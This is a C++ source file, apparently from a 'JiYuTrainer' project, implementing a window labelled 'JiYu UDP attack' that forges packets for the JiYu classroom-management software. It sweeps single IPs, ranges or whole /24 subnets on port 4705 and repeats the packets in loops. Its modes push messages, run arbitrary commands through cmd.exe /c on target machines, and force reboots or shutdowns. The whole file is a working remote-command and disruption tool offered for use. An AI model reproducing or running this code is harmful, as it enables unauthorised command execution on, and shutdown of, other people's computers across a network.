#include "stdafx.h"
#include "UdpAttackWindow.h"
#include "resource.h"
#include "UdpAttackTemplates.h"
#include "../JiYuTrainer/StringHlp.h"
#include <string>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

UdpAttackWindow::UdpAttackWindow(HWND parentHWnd) :
	CommonWindow(parentHWnd, 560, 520,
		L"JiYuTrainerUdpAttackWindow", L"极域UDP攻击",
		IDR_HTML_UDPATTACK)
{
	init();
	Show();
}

UdpAttackWindow::~UdpAttackWindow()
{
}

bool UdpAttackWindow::on_event(HELEMENT he, HELEMENT target, BEHAVIOR_EVENTS type, UINT_PTR reason)
{
	sciter::dom::element ele(he);
	if (type == HYPERLINK_CLICK || type == BUTTON_CLICK)
	{
		sciter::string id = ele.get_attribute("id");
		if (id == L"btn_send")
			OnSend();
		else if (id == L"btn_clearlog")
			OnClearLog();
	}
	return false;
}

LRESULT UdpAttackWindow::onWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, BOOL* handled)
{
	switch (message)
	{
	case WM_MY_FORCE_HIDE: {
		Hide();
		*handled = TRUE;
		return 0;
	}
	default:
		return 0;
	}
}

void UdpAttackWindow::Log(const std::wstring& msg)
{
	currentLog += msg + L"\r\n";
	if (text_log.is_valid())
		text_log.set_text(currentLog.c_str());
}

void UdpAttackWindow::OnClearLog()
{
	currentLog = L"";
	if (text_log.is_valid())
		text_log.set_text(L"");
}

std::vector<std::wstring> UdpAttackWindow::ParseIP(const std::wstring& input)
{
	std::vector<std::wstring> result;
	if (input.find(L".") == std::wstring::npos)
		return result;

	if (input.find(L"-") != std::wstring::npos)
	{
		// IP范围: 192.168.1.10-50
		size_t dash = input.find(L"-");
		std::wstring base = input.substr(0, dash);
		int endIP = _wtoi(input.substr(dash + 1).c_str());
		if (endIP > 254) endIP = 254;
		size_t lastDot = base.find_last_of(L".");
		std::wstring prefix = base.substr(0, lastDot + 1);
		int startIP = _wtoi(base.substr(lastDot + 1).c_str());
		for (int i = startIP; i <= endIP; i++)
		{
			result.push_back(prefix + std::to_wstring(i));
		}
	}
	else if (input.find(L"/24") != std::wstring::npos)
	{
		// C段: 192.168.1.1/24
		size_t slash = input.find(L"/");
		std::wstring base = input.substr(0, slash);
		size_t lastDot = base.find_last_of(L".");
		std::wstring prefix = base.substr(0, lastDot + 1);
		for (int i = 1; i <= 254; i++)
		{
			result.push_back(prefix + std::to_wstring(i));
		}
	}
	else
	{
		// 单IP
		result.push_back(input);
	}
	return result;
}

std::vector<unsigned char> UdpAttackWindow::BuildMsgPacket(const std::wstring& msg)
{
	std::vector<unsigned char> packet(MSG_TEMPLATE, MSG_TEMPLATE + sizeof(MSG_TEMPLATE));
	int index = 56;
	for (wchar_t ch : msg)
	{
		if (index + 1 >= (int)packet.size()) break;
		packet[index++] = (unsigned char)(ch & 0xFF);
		packet[index++] = (unsigned char)((ch >> 8) & 0xFF);
	}
	return packet;
}

std::vector<unsigned char> UdpAttackWindow::BuildCmdPacket(const std::wstring& cmd)
{
	std::vector<unsigned char> packet(CMD_TEMPLATE, CMD_TEMPLATE + sizeof(CMD_TEMPLATE));
	// 命令模板：cmd.exe在偏移100，/c 在偏移572，用户命令从偏移578开始
	int index = 578;
	for (wchar_t ch : cmd)
	{
		if (index + 1 >= (int)packet.size()) break;
		packet[index++] = (unsigned char)(ch & 0xFF);
		packet[index++] = (unsigned char)((ch >> 8) & 0xFF);
	}
	return packet;
}

bool UdpAttackWindow::SendUdp(const std::wstring& ip, int port, const std::vector<unsigned char>& data)
{
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == INVALID_SOCKET) return false;

	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons((u_short)port);
	char* ipUtf8 = StringHlp::UnicodeToUtf8(ip.c_str());
	inet_pton(AF_INET, ipUtf8, &addr.sin_addr);
	StringHlp::FreeStringPtr(ipUtf8);

	int ret = sendto(sock, (const char*)data.data(), (int)data.size(), 0, (sockaddr*)&addr, sizeof(addr));
	closesocket(sock);
	return ret != SOCKET_ERROR;
}

void UdpAttackWindow::OnSend()
{
	std::wstring ipStr = input_ip.get_value().to_string();
	int port = _wtoi(input_port.get_value().to_string().c_str());
	if (port <= 0) port = 4705;
	int modeIdx = select_mode.get_value().get(0);
	std::wstring mode;
	switch (modeIdx) {
	case 0: mode = L"msg"; break;
	case 1: mode = L"cmd"; break;
	case 2: mode = L"reboot"; break;
	case 3: mode = L"shutdown"; break;
	default: mode = L"msg"; break;
	}
	std::wstring content = input_content.get_value().to_string();
	int loopCount = _wtoi(input_loop.get_value().to_string().c_str());
	if (loopCount <= 0) loopCount = 1;
	int interval = _wtoi(input_interval.get_value().to_string().c_str());
	if (interval <= 0) interval = 0;

	if (ipStr.empty())
	{
		Log(L"[-] 请输入目标IP地址");
		return;
	}

	std::vector<std::wstring> targets = ParseIP(ipStr);
	if (targets.empty())
	{
		Log(L"[-] IP地址格式错误");
		return;
	}

	Log(L"[*] 目标数量: " + std::to_wstring(targets.size()));
	Log(L"[*] 攻击模式: " + mode);

	// 初始化Winsock
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	for (int t = 0; t < loopCount; t++)
	{
		for (const auto& target : targets)
		{
			bool ok = false;
			if (mode == L"msg")
			{
				if (content.empty()) { Log(L"[-] 请输入消息内容"); continue; }
				auto pkt = BuildMsgPacket(content);
				ok = SendUdp(target, port, pkt);
			}
			else if (mode == L"cmd")
			{
				if (content.empty()) { Log(L"[-] 请输入命令内容"); continue; }
				auto pkt = BuildCmdPacket(content);
				ok = SendUdp(target, port, pkt);
			}
			else if (mode == L"reboot")
			{
				std::vector<unsigned char> pkt(REBOOT_TEMPLATE, REBOOT_TEMPLATE + sizeof(REBOOT_TEMPLATE));
				ok = SendUdp(target, port, pkt);
			}
			else if (mode == L"shutdown")
			{
				std::vector<unsigned char> pkt(SHUTDOWN_TEMPLATE, SHUTDOWN_TEMPLATE + sizeof(SHUTDOWN_TEMPLATE));
				ok = SendUdp(target, port, pkt);
			}

			if (ok)
				Log(L"[+] " + target + L" 发送成功");
			else
				Log(L"[-] " + target + L" 发送失败");
		}
		if (loopCount > 1 && t < loopCount - 1)
		{
			Log(L"[*] 等待 " + std::to_wstring(interval) + L" 秒后继续...");
			Sleep(interval * 1000);
		}
	}

	WSACleanup();
	Log(L"[*] 攻击完成");
}

sciter::value UdpAttackWindow::docunmentComplete()
{
	CommonWindow::docunmentComplete();

	sciter::dom::element root = get_root();
	input_ip = root.get_element_by_id(L"input_ip");
	input_port = root.get_element_by_id(L"input_port");
	select_mode = root.get_element_by_id(L"select_mode");
	input_content = root.get_element_by_id(L"input_content");
	input_loop = root.get_element_by_id(L"input_loop");
	input_interval = root.get_element_by_id(L"input_interval");
	btn_send = root.get_element_by_id(L"btn_send");
	btn_clear = root.get_element_by_id(L"btn_clearlog");
	text_log = root.get_element_by_id(L"text_log");

	return sciter::value(true);
}
